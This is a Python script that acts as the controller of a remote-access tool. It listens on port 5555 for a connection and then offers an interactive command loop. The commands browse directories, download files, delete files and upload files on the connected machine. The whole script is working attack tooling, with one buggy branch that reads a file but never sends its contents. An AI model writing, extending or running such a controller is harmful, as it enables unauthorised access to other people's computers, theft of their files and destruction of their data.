import os
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = ''
port = 5555
s.bind((host, port))
print("")
print("IT's Listning.....", host)
print("Waiting for Connections............. ")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, " is Connected ")
# Connection completed
# Command control
while 1:
    command = input(str("Command >> "))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command Output : ", files)
    elif command == 'custom_dir':
        conn.send(command.encode())
        print("")
        user_input = input(str("custom dir : "))
        conn.send(user_input.encode())

        files = conn.recv(5000)
        files = files.decode()
        print("Command Output : ", files)

    elif command == 'download_file':
        conn.send(command.encode())
        print("")
        filepath = input(str("File Path : "))
        conn.send(filepath.encode())
        files = conn.recv(100000)
        filename = input(str("Enter file path where to save: "))
        new_file = open(filename, "wb")
        new_file.write(files)
        print(filename, " is downloaded")
    elif command == 'remove_file':
        conn.send(command.encode())
        print("")
        fileaddr = input(str("Enter file path where to delete: "))
        conn.send(fileaddr.encode())
        print("Deleted")
    elif command == 'send_file':
        conn.send(command.encode())
        print("")
        file = input(str("Enter file path where is: "))
        filename = input(str("Enter file name: "))
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print("Send File")
    else:
        print("-----------FAILED-----------")
